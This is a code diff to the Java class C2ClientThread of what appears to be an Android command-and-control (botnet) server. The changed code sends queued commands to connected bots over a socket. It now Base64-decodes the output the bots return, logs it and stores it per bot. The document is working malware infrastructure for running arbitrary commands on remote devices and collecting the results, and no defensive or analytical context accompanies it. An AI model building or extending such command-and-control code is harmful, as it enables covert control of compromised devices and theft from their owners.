@@ -1,5 +1,6 @@
 package c2.mobile.mobilec2;
 
+import android.content.Intent;
 import android.util.Log;
 
 import java.io.BufferedReader;
@@ -9,7 +10,9 @@ import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
 import java.net.Socket;
+import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
+import java.util.Base64;
 import java.util.UUID;
 
 public class C2ClientThread extends Thread {
@@ -62,10 +65,12 @@ public class C2ClientThread extends Thread {
                             ArrayList<String> outs = commandDatabase.getFromDatabase(uuid.toString(), BotEntryContract.BotEntry.output);
                             String outputs = outs.get(0);
                             //if there is a command, send command and readLine for output
-                            if (!command.equals("") && outputs.equals("")) {
+                            if (!command.equals("") && outputs != null && !outputs.equals("Success")) {
                                 out.println(command);
                                 String output = in.readLine();
-                                commandDatabase.updateDatabase(uuid.toString(), command, output);
+                                output = new String(Base64.getDecoder().decode(output.getBytes(StandardCharsets.UTF_8)));
+                                Log.e("From client: ", output);
+                                commandDatabase.updateDatabase(uuid.toString(), "", output);
 
                                 //if there is no command, send "none"
                             } else {
